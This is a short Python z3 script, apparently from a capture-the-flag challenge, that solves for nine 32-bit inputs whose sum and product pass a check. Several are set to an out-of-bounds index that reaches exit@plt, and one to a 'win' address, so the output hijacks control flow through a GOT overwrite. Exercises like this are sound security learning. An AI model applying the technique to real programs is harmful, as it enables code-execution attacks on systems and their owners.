from z3 import *

S = Solver()

array = [ BitVec('bv_%s' % i, 32) for i in range(9) ]

# for i in range(9):
#     S.add(array[i] * 4 <= 0xfffffff)

S.add(array[0] == 0x3fffff97) # index of the array, this value * 4 is offset to exit@plt
S.add(array[1] == 0x3fffff97) # index of the array, this value * 4 is offset to exit@plt
S.add(array[2] == 0x3fffff97) # index of the array, this value * 4 is offset to exit@plt
S.add(array[3] == 0x8048799) # win address

S.add(array[0] + array[1] + array[2] + array[3] + array[4] + array[5] + array[6] + array[7] + array[8] == 45)
S.add(array[0] * array[1] * array[2] * array[3] * array[4] * array[5] * array[6] * array[7] * array[8] == 362880)


print(S.check())
print(S.model())

